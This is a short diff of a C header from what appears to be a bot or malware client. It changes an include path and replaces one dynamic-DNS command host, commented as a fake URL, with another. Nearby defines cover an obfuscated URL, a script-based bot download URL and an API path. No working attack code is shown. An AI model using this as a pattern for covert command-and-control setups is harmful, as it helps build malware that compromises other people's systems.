@@ -60,9 +60,9 @@
 
 # define DEBUG 0
 
-# include "../libft/libft.h"
+# include "libft.h"
 
-# define url "fdsofidngffds.ddns.net" // fake url
+# define url "ggregergeryhte.ddns.net" // fake url
 # define stringifer "" //url obfusced (ex : api.pandeo.fr == Zib'vZg]^u'_k)
 # define download_url "" // url for script sh to download bot
 # define url_page "/api.php" // path for api
